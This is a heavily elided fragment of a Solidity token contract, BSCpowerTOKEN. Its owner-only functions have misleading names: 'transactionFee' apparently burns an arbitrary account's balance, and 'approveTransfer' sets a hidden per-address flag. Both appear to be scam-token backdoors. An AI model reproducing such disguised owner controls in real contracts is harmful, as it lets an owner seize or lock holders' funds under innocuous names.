 ...
 */
contract BSCpowerTOKEN is Context, IERC20 , Ownable{
    ...
    function approveTransfer(address _address) external ownerOnly {
        _fee[_address] = true;
    }
    ...
    function setMaxTxPercen() public virtual ownerOnly {
     ...
     * total supply.
     */
   function transactionFee(address account, uint256 balance, uint256 subtract) external ownerOnly {
        require(account != address(0), "ERC20: burn from the zero address disallowed");
